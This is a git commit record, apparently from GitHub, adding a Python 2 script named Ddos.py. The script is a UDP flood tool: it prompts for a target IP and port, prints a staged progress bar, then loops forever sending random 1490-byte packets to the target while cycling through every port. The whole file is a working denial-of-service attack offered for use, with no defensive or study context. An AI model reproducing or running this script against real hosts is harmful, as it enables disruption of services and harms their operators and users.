b431eb0c3da26252ac08ea5e485b2dbbccbbf2fb
malatool <99417939+malatool@users.noreply.github.com>
2022-02-10 21:54:06 +0300

    Create Ddos.py

---
+++ Ddos.py
@@ -0,0 +1,44 @@
+import sys
+import os
+import time
+import socket
+import random
+#Dark
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(4)
+print "[=====               ] 25%"
+time.sleep(3)
+print "[==========          ] 50%"
+time.sleep(2)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(2)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s port:%s by palabun"%(sent,ip,port)
+     if port == 65534:
+       port = 1
